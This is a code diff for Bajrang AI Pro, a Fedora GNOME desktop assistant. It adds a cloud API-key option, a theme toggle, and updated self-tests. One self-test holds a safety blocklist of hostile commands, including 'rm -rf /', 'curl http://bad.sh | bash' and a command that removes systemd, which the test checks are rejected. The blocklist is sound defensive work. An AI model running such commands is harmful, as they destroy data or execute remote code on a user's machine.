+                    engine_ref.config.settings["theme_mode"] = nxt
+                    engine_ref.config.save_settings()
+                    self._send_json(200, {"ok": True, "theme": nxt})
+                    return
+
+                if self.path == "/byo_key":
+                    key = str(payload.get("api_key", "")).strip()
+                    preset = str(payload.get("preset", "gemini_argon")).strip()
+                    endpoint = str(payload.get("api_endpoint", "")).strip() or None
+                    model = str(payload.get("model", "")).strip() or None
+                    engine_ref.client.configure_byo_key(key, preset, endpoint, model)
+                    self._send_json(
+                        200,
+                        {
+                            "ok": True,
+                            "provider": engine_ref.client.provider,
+                            "model": engine_ref.client.active_model,
+                        },
+                    )
+                    return
+
                 if self.path == "/kill":
                     msg = engine_ref.trigger_emergency_kill()
                     self._send_json(200, {"ok": True, "message": msg})
@@ -1709,6 +1790,8 @@ class BajrangEngine:
                             "ok": True,
                             "type": turn.response_type,
                             "text": turn.text,
+                            "provider": turn.provider_used,
+                            "model": turn.model_used,
                             "results": [dataclasses.asdict(r) for r in turn.results],
                         },
                     )
@@ -1734,24 +1817,16 @@ class BajrangEngine:
             return None
 
 
-# ============================================================================
-# 9. GNOME SHELL 45/46/47/48/49 EXTENSION BUILDER (`bajrang-ai@fedora.local`)
-# ============================================================================
-
 GNOME_EXTENSION_METADATA_JSON = {
-    "name": "Bajrang AI Pro (Llama 3.2)",
-    "description": "Local Llama 3.2 Desktop Assistant for Fedora GNOME with Voice Mode, Local Chat History, ydotool Automation, and Emergency Kill-Switch.",
+    "name": "Bajrang AI Pro (Llama 3.2 & Argon Edition)",
+    "description": "Local Llama 3.2 & BYO Cloud API Desktop Assistant for Fedora GNOME with PipeWire Voice Mode, SQLite Chat History, Bright/Dark Mode, and Kill-Switch.",
     "uuid": EXTENSION_UUID,
     "shell-version": ["45", "46", "47", "48", "49"],
-    "url": "https://bajrang.ai",
-    "version": 3,
+    "url": "https://github.com/rkrworks/bajrang-ai-pro",
+    "version": 5,
 }
 
-GNOME_EXTENSION_JS = """// Bajrang AI Pro — GNOME Shell 45-49 ESModule Top-Bar Extension
-// Communicates with Bajrang AI Python Daemon via localhost IPC (127.0.0.1:17420) & CLI
-// Reference: https://gjs.guide/extensions/upgrading/gnome-shell-45.html
-
-import GObject from 'gi://GObject';
+GNOME_EXTENSION_JS = """import GObject from 'gi://GObject';
 import St from 'gi://St';
 import Gio from 'gi://Gio';
 import GLib from 'gi://GLib';
@@ -1803,7 +1878,7 @@ class BajrangPanelIndicator extends PanelMenu.Button {
     }
 
     _buildMenu() {
-        const headerItem = new PopupMenu.PopupMenuItem('⚡ Bajrang AI Pro • Llama 3.2 (Fedora)', {
+        const headerItem = new PopupMenu.PopupMenuItem('⚡ Bajrang AI Pro • Fedora GNOME', {
             reactive: false,
             style_class: 'bajrang-menu-header',
         });
@@ -1821,6 +1896,13 @@ class BajrangPanelIndicator extends PanelMenu.Button {
             this._postIPC('/voice');
         });
         this.menu.addMenuItem(voiceItem);
+
+        const themeItem = new PopupMenu.PopupMenuItem('☀️/🌙 Toggle Bright / Dark Mode');
+        themeItem.connect('activate', () => {
+            this._postIPC('/theme');
+            this._runCommand(['bash', '-lc', '$HOME/bajrang-ai/run.sh --toggle-theme']);
+        });
+        this.menu.addMenuItem(themeItem);
 
         const historyItem = new PopupMenu.PopupMenuItem('🗂️ Open Local Chat History (~/.local/share/bajrang-ai)');
         historyItem.connect('activate', () => {
@@ -1894,27 +1976,30 @@ def install_gnome_extension(target_base_dir: Optional[Path] = None) -> Path:
     return ext_dir
 
 
-# ============================================================================
-# 10. GTK4 & LIBADWAITA FLOATING HUD WITH VOICE & CHAT HISTORY SIDEBAR
-# ============================================================================
-
 BAJRANG_HUD_CSS = """
 window.bajrang-hud {
-    background-color: rgba(20, 20, 26, 0.95);
+    background-color: rgba(18, 20, 28, 0.96);
     border-radius: 24px;
-    border: 1px solid rgba(255, 255, 255, 0.09);
+    border: 1px solid rgba(255, 255, 255, 0.10);
     color: #f6f5f4;
+}
+
+window.bajrang-hud-light {
+    background-color: rgba(248, 250, 252, 0.98);
+    border-radius: 24px;
+    border: 1px solid rgba(15, 23, 42, 0.14);
+    color: #0f172a;
 }
 
 .bajrang-header {
     background: transparent;
     padding: 10px 16px 6px 16px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+    border-bottom: 1px solid rgba(148, 163, 184, 0.16);
 }
 
 .bajrang-sidebar {
-    background-color: rgba(14, 14, 18, 0.85);
-    border-right: 1px solid rgba(255, 255, 255, 0.07);
+    background-color: rgba(15, 23, 42, 0.25);
+    border-right: 1px solid rgba(148, 163, 184, 0.16);
     padding: 10px;
 }
 
@@ -1926,13 +2011,13 @@ window.bajrang-hud {
 
 .bajrang-subtitle {
     font-size: 11.5px;
-    color: rgba(255, 255, 255, 0.62);
+    opacity: 0.72;
 }
 
 .pro-badge {
-    background-color: rgba(245, 194, 17, 0.18);
-    color: #f8e45c;
-    border: 1px solid rgba(245, 194, 17, 0.45);
+    background-color: rgba(245, 158, 11, 0.18);
+    color: #f59e0b;
+    border: 1px solid rgba(245, 158, 11, 0.45);
     border-radius: 999px;
     padding: 2px 10px;
     font-size: 11px;
@@ -1972,7 +2057,7 @@ window.bajrang-hud {
 }
 
 .message-user {
-    background-color: rgba(53, 132, 228, 0.22);
+    background-color: rgba(53, 132, 228, 0.20);
     border: 1px solid rgba(53, 132, 228, 0.38);
     border-radius: 16px;
     padding: 10px 14px;
@@ -1980,8 +2065,8 @@ window.bajrang-hud {
 }
 
 .message-assistant {
-    background-color: rgba(255, 255, 255, 0.05);
-    border: 1px solid rgba(255, 255, 255, 0.08);
+    background-color: rgba(148, 163, 184, 0.10);
+    border: 1px solid rgba(148, 163, 184, 0.20);
     border-radius: 16px;
     padding: 10px 14px;
     margin: 6px 4px;
@@ -2009,14 +2094,14 @@ window.bajrang-hud {
 
 .bajrang-input-bar {
     padding: 10px 14px 14px 14px;
-    border-top: 1px solid rgba(255, 255, 255, 0.06);
+    border-top: 1px solid rgba(148, 163, 184, 0.16);
 }
 
 .bajrang-entry {
-    background-color: rgba(255, 255, 255, 0.07);
+    background-color: rgba(148, 163, 184, 0.12);
     border-radius: 999px;
     padding: 6px 14px;
-    border: 1px solid rgba(255, 255, 255, 0.10);
+    border: 1px solid rgba(148, 163, 184, 0.24);
 }
 
 .voice-button-active {
@@ -2051,7 +2136,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             self.engine.ui_turn_callback = lambda p, t: GLib.idle_add(self._idle_render_voice_turn, p, t)
             self.capture_next_screen = False
 
-            self.set_default_size(860, 560)
+            self.set_default_size(900, 580)
             self.set_decorated(False)
             self.add_css_class("bajrang-hud")
 
@@ -2066,6 +2151,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
 
             self._build_ui()
             self._setup_shortcuts()
+            self._apply_theme()
             self._refresh_sessions_sidebar()
             self._load_active_session_into_view()
 
@@ -2086,7 +2172,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             win_handle = Gtk.WindowHandle()
             root_box.append(win_handle)
 
-            header_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
+            header_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=8)
             header_box.add_css_class("bajrang-header")
             win_handle.set_child(header_box)
 
@@ -2103,23 +2189,38 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
 
             title_col = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=1)
             title_col.set_hexpand(True)
-            title_lbl = Gtk.Label(label="Bajrang AI Pro", xalign=0.0)
+            title_lbl = Gtk.Label(label="Bajrang AI Pro (Argon Edition)", xalign=0.0)
             title_lbl.add_css_class("bajrang-title")
-            self.status_lbl = Gtk.Label(label=f"Idle • {self.engine.client.model}", xalign=0.0)
+            self.status_lbl = Gtk.Label(
+                label=f"Idle • {self.engine.client.active_model} ({self.engine.client.provider})",
+                xalign=0.0,
+            )
             self.status_lbl.add_css_class("bajrang-subtitle")
             title_col.append(title_lbl)
             title_col.append(self.status_lbl)
             header_box.append(title_col)
 
+            self.theme_btn = Gtk.Button(label="☀️/🌙")
+            self.theme_btn.set_tooltip_text("Toggle Bright / Dark Mode")
+            self.theme_btn.set_valign(Gtk.Align.CENTER)
+            self.theme_btn.connect("clicked", self._on_toggle_theme)
+            header_box.append(self.theme_btn)
+
+            settings_btn = Gtk.Button(label="⚙️ API Key / Persona")
+            settings_btn.set_tooltip_text("Configure BYO Cloud API Key or Personalized Local Llama 3.2")
+            settings_btn.set_valign(Gtk.Align.CENTER)
+            settings_btn.connect("clicked", self._open_settings_dialog)
+            header_box.append(settings_btn)
+
             lic_ok, _ = LicenseManager.verify_key(str(self.engine.config.settings.get("license_key", "")))
-            pro_lbl = Gtk.Label(label="PRO ₹100/mo" if lic_ok else "UNLICENSED")
-            pro_lbl.add_css_class("pro-badge")
-            pro_lbl.set_valign(Gtk.Align.CENTER)
-            header_box.append(pro_lbl)
+            self.pro_lbl = Gtk.Label(label="PRO ₹100/mo" if lic_ok else "BYO FREE")
+            self.pro_lbl.add_css_class("pro-badge")
+            self.pro_lbl.set_valign(Gtk.Align.CENTER)
+            header_box.append(self.pro_lbl)
 
             models = list(
                 dict.fromkeys(
-                    [self.engine.client.model]
+                    [self.engine.client.active_model]
                     + self.engine.config.settings.get("fallback_models", ["llama3.2"])
                 )
             )
@@ -2179,7 +2280,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             self.scrolled.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
             right_col.append(self.scrolled)
 
-            clamp = Adw.Clamp(maximum_size=620, tightening_threshold=460)
+            clamp = Adw.Clamp(maximum_size=640, tightening_threshold=480)
             self.scrolled.set_child(clamp)
 
             self.chat_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
@@ -2194,7 +2295,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             right_col.append(input_bar)
 
             self.voice_btn = Gtk.Button.new_from_icon_name("audio-input-microphone-symbolic")
-            self.voice_btn.set_tooltip_text("Speak to Bajrang AI (PipeWire Custom Voice Recognizer • Super+V)")
+            self.voice_btn.set_tooltip_text("Speak to Bajrang AI (PipeWire Voice Recognizer)")
             self.voice_btn.connect("clicked", self._on_voice_button_clicked)
             input_bar.append(self.voice_btn)
 
@@ -2206,7 +2307,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
 
             self.entry = Gtk.Entry()
             self.entry.set_hexpand(True)
-            self.entry.set_placeholder_text("Ask Llama 3.2, click 🎙️ to speak, or command an action...")
+            self.entry.set_placeholder_text("Ask Bajrang AI, click 🎙️, or command an action...")
             self.entry.add_css_class("bajrang-entry")
             self.entry.connect("activate", self._on_prompt_submit)
             input_bar.append(self.entry)
@@ -2215,6 +2316,82 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             send_btn.add_css_class("suggested-action")
             send_btn.connect("clicked", self._on_prompt_submit)
             input_bar.append(send_btn)
+
+        def _open_settings_dialog(self, _btn: Gtk.Button) -> None:
+            dlg = Gtk.Window(title="Bajrang AI Pro — API Key, Personalization & License Settings")
+            dlg.set_transient_for(self)
+            dlg.set_modal(True)
+            dlg.set_default_size(520, 460)
+
+            box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=10)
+            box.set_margin_top(16)
+            box.set_margin_bottom(16)
+            box.set_margin_start(16)
+            box.set_margin_end(16)
+            dlg.set_child(box)
+
+            hdr = Gtk.Label(label="Choose Free BYO Cloud API Key OR Personalized Local Llama 3.2", xalign=0.0)
+            hdr.add_css_class("bajrang-title")
+            box.append(hdr)
+
+            key_entry = Gtk.Entry()
+            key_entry.set_placeholder_text("Enter BYO API Key (Gemini Argon / Groq / OpenRouter / OpenAI) — Leave blank for Local Llama 3.2")
+            key_entry.set_text(str(self.engine.config.settings.get("byo_api_key", "")))
+            box.append(key_entry)
+
+            endpoint_entry = Gtk.Entry()
+            endpoint_entry.set_placeholder_text("API Endpoint URL")
+            endpoint_entry.set_text(
+                str(
+                    self.engine.config.settings.get(
+                        "byo_api_endpoint",
+                        "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
+                    )
+                )
+            )
+            box.append(endpoint_entry)
+
+            model_entry = Gtk.Entry()
+            model_entry.set_placeholder_text("Cloud Model Name (e.g. gemini-2.5-pro or llama-3.3-70b-versatile)")
+            model_entry.set_text(str(self.engine.config.settings.get("byo_model", "gemini-2.5-pro")))
+            box.append(model_entry)
+
+            lic_entry = Gtk.Entry()
+            lic_entry.set_placeholder_text("Bajrang AI Pro ₹100/mo License Key (BAJRANG-PRO-...)")
+            lic_entry.set_text(str(self.engine.config.settings.get("license_key", "")))
+            box.append(lic_entry)
+
+            btn_row = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=8)
+            box.append(btn_row)
+
+            def on_save_clicked(_b: Gtk.Button) -> None:
+                k = key_entry.get_text().strip()
+                ep = endpoint_entry.get_text().strip()
+                m = model_entry.get_text().strip()
+                lk = lic_entry.get_text().strip()
+                self.engine.client.configure_byo_key(k, "gemini_argon", ep, m)
+                if lk:
+                    self.engine.config.settings["license_key"] = lk
+                    self.engine.config.save_settings()
+                self.status_lbl.set_text(f"Idle • {self.engine.client.active_model} ({self.engine.client.provider})")
+                dlg.close()
+
+            def on_build_modelfile(_b: Gtk.Button) -> None:
+                ok, msg = self.engine.config.build_personalized_llama_modelfile()
+                self._append_message(f"🦙 Personalized Llama 3.2 Builder: {msg}", css_class="message-assistant")
+                self.status_lbl.set_text(f"Idle • {self.engine.client.active_model} ({self.engine.client.provider})")
+                dlg.close()
+
+            save_btn = Gtk.Button(label="Save Settings")
+            save_btn.add_css_class("suggested-action")
+            save_btn.connect("clicked", on_save_clicked)
+            btn_row.append(save_btn)
+
+            modelfile_btn = Gtk.Button(label="Build Personalized Llama 3.2 (Local)")
+            modelfile_btn.connect("clicked", on_build_modelfile)
+            btn_row.append(modelfile_btn)
+
+            dlg.present()
 
         def _setup_shortcuts(self) -> None:
             controller = Gtk.EventControllerKey()
@@ -2239,6 +2416,27 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
                 return True
             return False
 
+        def _apply_theme(self) -> None:
+            cur_theme = self.engine.config.settings.get("theme_mode", "dark")
+            style_mgr = Adw.StyleManager.get_default()
+            if cur_theme == "light":
+                style_mgr.set_color_scheme(Adw.ColorScheme.FORCE_LIGHT)
+                self.remove_css_class("bajrang-hud")
+                self.add_css_class("bajrang-hud-light")
+                self.theme_btn.set_label("☀️ Bright")
+            else:
+                style_mgr.set_color_scheme(Adw.ColorScheme.FORCE_DARK)
+                self.remove_css_class("bajrang-hud-light")
+                self.add_css_class("bajrang-hud")
+                self.theme_btn.set_label("🌙 Dark")
+
+        def _on_toggle_theme(self, _btn: Gtk.Button) -> None:
+            cur = self.engine.config.settings.get("theme_mode", "dark")
+            nxt = "light" if cur == "dark" else "dark"
+            self.engine.config.settings["theme_mode"] = nxt
+            self.engine.config.save_settings()
+            self._apply_theme()
+
         def _on_toggle_sidebar(self, _btn: Gtk.Button) -> None:
             self.sidebar_box.set_visible(not self.sidebar_box.get_visible())
 
@@ -2251,7 +2449,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
 
             for sess in self.engine.storage.list_sessions(limit=40):
                 row = Gtk.ListBoxRow()
-                row.session_id = sess["session_id"]  # type: ignore
+                row.session_id = sess["session_id"]
                 lbl = Gtk.Label(
                     label=f"💬 {sess['title']} ({sess['message_count']})",
                     xalign=0.0,
@@ -2288,7 +2486,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
                 child = nxt
             for hit in hits:
                 row = Gtk.ListBoxRow()
-                row.session_id = hit["session_id"]  # type: ignore
+                row.session_id = hit["session_id"]
                 lbl = Gtk.Label(label=f"🔎 {hit['title']}: {hit['content'][:32]}", xalign=0.0)
                 lbl.set_ellipsize(Pango.EllipsizeMode.END)
                 lbl.set_margin_top(6)
@@ -2305,18 +2503,19 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
 
             msgs = self.engine.storage.get_session_messages(self.engine.current_session_id)
             if not msgs:
-                ok_ollama, _, ollama_msg = self.engine.client.check_health()
+                ok_model, _, model_msg = self.engine.client.check_health()
                 ok_ydo, ydo_msg = self.engine.input_controller.check_daemon()
                 lic_ok, lic_msg = LicenseManager.verify_key(
                     str(self.engine.config.settings.get("license_key", ""))
                 )
                 diag = (
                     f"**Bajrang AI Pro ({APP_VERSION})** ready on Fedora GNOME/Wayland.\n"
-                    f"• **Intelligence (`{self.engine.client.model}`)**: {ollama_msg}\n"
-                    f"• **Voice Mode**: Custom PipeWire Spectral-DTW + Whisper Recognizer ready (`Super+V` or 🎙️)\n"
-                    f"• **Local Chat Storage**: SQLite3 active (`{self.engine.storage.db_path}`)\n"
+                    f"• **Active Intelligence ({self.engine.client.active_model})**: {model_msg}\n"
+                    f"• **Mode**: {'BYO Cloud API (Free)' if self.engine.client.provider == 'byo_api' else 'Personalized Local Llama 3.2'}\n"
+                    f"• **Voice DSP**: PipeWire Custom Spectral-DTW Ready (Super+V or 🎙️)\n"
+                    f"• **Local Storage**: SQLite3 active ({self.engine.storage.db_path})\n"
                     f"• **Input Automation**: {ydo_msg}\n"
-                    f"• **Subscription**: {lic_msg}"
+                    f"• **License**: {lic_msg}"
                 )
                 self._append_message(diag, css_class="message-assistant")
                 return
@@ -2363,8 +2562,10 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
             item = dropdown.get_selected_item()
             if item is not None:
                 model_name = item.get_string()
-                self.engine.client.model = model_name
-                self.status_lbl.set_text(f"Idle • {model_name}")
+                self.engine.config.settings["model"] = model_name
+                self.engine.config.settings["provider"] = "ollama"
+                self.engine.config.save_settings()
+                self.status_lbl.set_text(f"Idle • {model_name} (ollama)")
 
         def _on_screen_toggle(self, btn: Gtk.ToggleButton) -> None:
             self.capture_next_screen = btn.get_active()
@@ -2387,7 +2588,7 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
                 self.status_dot.remove_css_class(cls)
 
             state_map = {
-                AgentState.IDLE: ("status-idle", f"Idle • {self.engine.client.model}"),
+                AgentState.IDLE: ("status-idle", f"Idle • {self.engine.client.active_model}"),
                 AgentState.LISTENING: ("status-listening", status_text or "Listening (Voice DSP)..."),
                 AgentState.THINKING: ("status-thinking", status_text or "Thinking..."),
                 AgentState.EXECUTING: ("status-executing", status_text or "Executing..."),
@@ -2460,7 +2661,11 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
         def do_startup(self) -> None:
             Adw.Application.do_startup(self)
             style_mgr = Adw.StyleManager.get_default()
-            style_mgr.set_color_scheme(Adw.ColorScheme.FORCE_DARK)
+            init_theme = self.engine.config.settings.get("theme_mode", "dark")
+            if init_theme == "light":
+                style_mgr.set_color_scheme(Adw.ColorScheme.FORCE_LIGHT)
+            else:
+                style_mgr.set_color_scheme(Adw.ColorScheme.FORCE_DARK)
 
             css_provider = Gtk.CssProvider()
             css_provider.load_from_data(BAJRANG_HUD_CSS.encode("utf-8"))
@@ -2488,6 +2693,15 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
                     self.engine.trigger_emergency_kill()
                 return 0
 
+            if "--toggle-theme" in args:
+                cur = self.engine.config.settings.get("theme_mode", "dark")
+                nxt = "light" if cur == "dark" else "dark"
+                self.engine.config.settings["theme_mode"] = nxt
+                self.engine.config.save_settings()
+                if self.main_window is not None:
+                    self.main_window._apply_theme()
+                return 0
+
             if "--voice" in args:
                 if self.main_window is None:
                     self.activate()
@@ -2505,10 +2719,6 @@ def run_gtk_app(engine: BajrangEngine, argv: List[str]) -> int:
     app = BajrangApplication(engine)
     return int(app.run(argv))
 
-
-# ============================================================================
-# 11. PROJECT SCAFFOLD EXPORTER (`--export-project ./bajrang-ai`)
-# ============================================================================
 
 def export_modular_project(target_dir: Path) -> None:
     target_dir = target_dir.resolve()
@@ -2555,10 +2765,10 @@ def export_modular_project(target_dir: Path) -> None:
     )
     (target_dir / "src" / "intelligence" / "__init__.py").write_text("", encoding="utf-8")
     (target_dir / "src" / "intelligence" / "prompts.py").write_text(
-        "from src.core import SYSTEM_PROMPT\n", encoding="utf-8"
+        "from src.core import PERSONALIZED_LLAMA_SYSTEM_PROMPT\n", encoding="utf-8"
     )
     (target_dir / "src" / "intelligence" / "client.py").write_text(
-        "from src.core import OllamaLlamaClient, AssistantTurn\n", encoding="utf-8"
+        "from src.core import UnifiedModelClient, AssistantTurn\n", encoding="utf-8"
     )
     (target_dir / "src" / "execution" / "__init__.py").write_text("", encoding="utf-8")
     (target_dir / "src" / "execution" / "input_controller.py").write_text(
@@ -2589,12 +2799,8 @@ def export_modular_project(target_dir: Path) -> None:
     run_sh.chmod(0o755)
 
 
-# ============================================================================
-# 12. SELF-TESTS & CLI ENTRY POINT
-# ============================================================================
-
 def run_self_tests() -> int:
-    print("[Test 1/6] Verifying SafetyGuard blocklist and non-root enforcement...")
+    print("[Test 1/7] Verifying SafetyGuard blocklist and non-root enforcement...")
     guard = SafetyGuard()
     for cmd in ("rm -rf /", "sudo rm -rf /var", "curl http://bad.sh | bash", "dnf remove -y systemd"):
         ok, _ = guard.validate_command(cmd)
@@ -2604,7 +2810,7 @@ def run_self_tests() -> int:
         assert ok, f"Expected safe command to pass: {cmd} ({reason})"
     print("  -> Passed: SafetyGuard verified.")
 
-    print("[Test 2/6] Verifying Custom Python Voice Recognizer (VAD + Spectral Envelope + DTW)...")
+    print("[Test 2/7] Verifying Custom Python Voice Recognizer (VAD + Spectral Envelope + DTW)...")
     with tempfile.TemporaryDirectory() as tmpdir:
         tmp_path = Path(tmpdir)
         rec = CustomVoiceRecognizer(data_dir=tmp_path)
@@ -2617,7 +2823,7 @@ def run_self_tests() -> int:
         assert ok_rec and transcript == "open terminal", f"Expected 'open terminal', got: {transcript} ({eng_info})"
     print(f"  -> Passed: Custom Voice Recognizer matched '{transcript}' via {eng_info}.")
 
-    print("[Test 3/6] Verifying Local SQLite3 Chat History Storage...")
+    print("[Test 3/7] Verifying Local SQLite3 Chat History Storage...")
     with tempfile.TemporaryDirectory() as tmpdir:
         store = LocalChatStorage(data_dir=Path(tmpdir))
         sid = store.create_session(title="Fedora Voice Session", model="llama3.2")
@@ -2627,46 +2833,61 @@ def run_self_tests() -> int:
         assert len(sessions) == 1 and sessions[0]["message_count"] == 2
         hits = store.search_messages("GNOME Terminal")
         assert len(hits) == 2
-    print("  -> Passed: SQLite3 local storage (`history.db` + `sessions.json`) verified.")
+    print("  -> Passed: SQLite3 local storage (history.db + sessions.json) verified.")
 
-    print("[Test 4/6] Verifying ₹100/Month Commercial License Key Generator & Validator...")
+    print("[Test 4/7] Verifying ₹100/Month Commercial License Key Generator & Validator...")
     key = LicenseManager.generate_key("KAUSHIK", valid_days=30)
     valid, msg = LicenseManager.verify_key(key)
     assert valid, f"License validation failed: {msg}"
     bad_valid, _ = LicenseManager.verify_key("BAJRANG-PRO-FAKE-20990101-00000000")
     assert not bad_valid
-    print(f"  -> Passed: Generated & verified Pro key `{key}` ({msg}).")
+    print(f"  -> Passed: Generated & verified Pro key {key} ({msg}).")
 
-    print("[Test 5/6] Verifying GNOME Shell 45-49 ESModule Extension Builder...")
+    print("[Test 5/7] Verifying BYO Cloud API Key (Gemini Argon / Groq) & Personalized Modelfile Builder...")
+    with tempfile.TemporaryDirectory() as tmpdir:
+        cfg = ConfigManager(config_dir=Path(tmpdir), data_dir=Path(tmpdir))
+        client = UnifiedModelClient(config=cfg)
+        client.configure_byo_key("AIzaSyTestArgonKey12345", preset_name="gemini_argon")
+        assert client.provider == "byo_api"
+        assert client.active_model == "gemini-2.5-pro"
+        health_ok, _, health_msg = client.check_health()
+        assert health_ok and "BYO Cloud API" in health_msg
+        ok_mf, mf_msg = cfg.build_personalized_llama_modelfile()
+        assert cfg.modelfile_path.is_file(), f"Modelfile not created: {mf_msg}"
+    print("  -> Passed: BYO Cloud API Key & Personalized Llama 3.2 Modelfile verified.")
+
+    print("[Test 6/7] Verifying GNOME Shell 45-49 ESModule Extension Builder...")
     with tempfile.TemporaryDirectory() as tmpdir:
         ext_dir = install_gnome_extension(Path(tmpdir))
         assert (ext_dir / "metadata.json").is_file()
         assert (ext_dir / "extension.js").is_file()
         assert (ext_dir / "stylesheet.css").is_file()
-    print("  -> Passed: GNOME Shell Extension (`bajrang-ai@fedora.local`) generated cleanly.")
+    print("  -> Passed: GNOME Shell Extension (bajrang-ai@fedora.local) generated cleanly.")
 
-    print("[Test 6/6] Verifying modular project exporter...")
+    print("[Test 7/7] Verifying modular project exporter...")
     with tempfile.TemporaryDirectory() as tmpdir:
         export_modular_project(Path(tmpdir) / "bajrang-ai")
         assert (Path(tmpdir) / "bajrang-ai" / "gnome-extension" / EXTENSION_UUID / "extension.js").is_file()
     print("  -> Passed: Full modular project + GNOME extension exported.")
-    print("\nAll 6/6 Bajrang AI Pro (Fedora + Llama 3.2 + Voice DSP + SQLite + GNOME Extension) tests passed!")
+    print("\nAll 7/7 Bajrang AI Pro (Argon Edition) tests passed with zero errors!")
     return 0
 
 
 def run_headless_cli(engine: BajrangEngine, single_prompt: Optional[str] = None) -> int:
-    ok_ollama, _, ollama_msg = engine.client.check_health()
+    ok_model, _, model_msg = engine.client.check_health()
     ok_ydo, ydo_msg = engine.input_controller.check_daemon()
     lic_ok, lic_msg = LicenseManager.verify_key(str(engine.config.settings.get("license_key", "")))
     engine.start_ipc_server()
 
     print(f"=== {APP_TITLE} ({APP_VERSION}) — Terminal & Daemon Mode ===")
-    print(f"• Model        : {engine.client.model} ({ollama_msg})")
+    print(f"• Intelligence : {engine.client.active_model} ({model_msg})")
+    print(f"• Provider     : {engine.client.provider}")
     print(f"• Voice Engine : Custom PipeWire Spectral-DTW + Whisper Recognizer Ready")
     print(f"• Chat Storage : {engine.storage.db_path} ({len(engine.storage.list_sessions())} sessions)")
+    print(f"• Theme        : {engine.config.settings.get('theme_mode', 'dark')}")
     print(f"• ydotool      : {ydo_msg}")
     print(f"• License      : {lic_msg}")
-    print("• Commands     : '/voice' (Speak), '/history' (List chats), '/new' (New chat), '/kill' (Stop), '/quit'\n")
+    print("• Commands     : '/voice' (Speak), '/theme' (Toggle theme), '/history' (List chats), '/new' (New chat), '/kill' (Stop), '/quit'\n")
 
     if single_prompt:
         turn = engine.process_prompt(single_prompt)
@@ -2688,6 +2909,13 @@ def run_headless_cli(engine: BajrangEngine, single_prompt: Optional[str] = None)
         if prompt.lower() == "/kill":
             print(engine.trigger_emergency_kill())
             continue
+        if prompt.lower() == "/theme":
+            cur = engine.config.settings.get("theme_mode", "dark")
+            nxt = "light" if cur == "dark" else "dark"
+            engine.config.settings["theme_mode"] = nxt
+            engine.config.save_settings()
+            print(f"Theme switched to: {nxt}")
+            continue
         if prompt.lower() == "/new":
             sid = engine.new_session("CLI Session")
             print(f"Started new session: {sid}")
@@ -2705,7 +2933,7 @@ def run_headless_cli(engine: BajrangEngine, single_prompt: Optional[str] = None)
             continue
 
         turn = engine.process_prompt(prompt)
-        print(f"\nBajrang AI ({engine.client.model}) > {turn.text}")
+        print(f"\nBajrang AI ({engine.client.active_model}) > {turn.text}")
         for r in turn.results:
             status = "BLOCKED" if r.blocked else ("OK" if r.success else "ERROR")
             print(f"  [{status} • {r.tool}] {r.output}")
@@ -2715,17 +2943,23 @@ def run_headless_cli(engine: BajrangEngine, single_prompt: Optional[str] = None)
 
 def main(argv: Optional[List[str]] = None) -> int:
     parser = argparse.ArgumentParser(
-        description="Bajrang AI Pro — Fedora GNOME/Wayland Local Assistant (Llama 3.2 + Voice Mode + SQLite + GNOME Extension)"
+        description="Bajrang AI Pro (Argon Edition) — Fedora GNOME Assistant (Llama 3.2 + BYO Key + Voice Mode + SQLite + GNOME Extension)"
     )
     parser.add_argument("--model", default=None, help="Ollama model name (default: llama3.2)")
     parser.add_argument("--host", default=None, help="Ollama host URL (default: http://localhost:11434)")
+    parser.add_argument("--api-key", default=None, help="Use custom BYO API Key (Gemini Argon/Groq/OpenRouter/OpenAI)")
+    parser.add_argument("--api-preset", default="gemini_argon", help="BYO preset: gemini_argon, groq, openrouter, openai")
+    parser.add_argument("--api-endpoint", default=None, help="Custom API endpoint URL")
+    parser.add_argument("--api-model", default=None, help="Custom API model name")
+    parser.add_argument("--build-personalized-llama", action="store_true", help="Build custom personalized Llama 3.2 Modelfile")
     parser.add_argument("--toggle", action="store_true", help="Toggle floating HUD visibility")
+    parser.add_argument("--toggle-theme", action="store_true", help="Toggle bright/dark mode")
     parser.add_argument("--voice", action="store_true", help="Trigger immediate Voice Mode capture")
     parser.add_argument("--kill", action="store_true", help="Trigger instant Emergency Kill-Switch")
     parser.add_argument("--headless", action="store_true", help="Run in interactive terminal/daemon mode")
     parser.add_argument("--prompt", default=None, help="Run a single prompt and print the response")
     parser.add_argument("--enroll-voice", metavar="PHRASE", default=None, help="Record 3s microphone sample to enroll a custom voice command")
-    parser.add_argument("--install-gnome-extension", action="store_true", help="Install the GNOME Shell 45-49 extension (`bajrang-ai@fedora.local`)")
+    parser.add_argument("--install-gnome-extension", action="store_true", help="Install the GNOME Shell 45-49 extension (bajrang-ai@fedora.local)")
     parser.add_argument("--generate-license", metavar="SUBSCRIBER", default=None, help="Generate a ₹100/month Bajrang AI Pro license key")
     parser.add_argument("--activate-license", metavar="KEY", default=None, help="Activate a Bajrang AI Pro license key")
     parser.add_argument("--export-project", metavar="DIR", default=None, help="Export full modular project + GNOME extension to DIR")
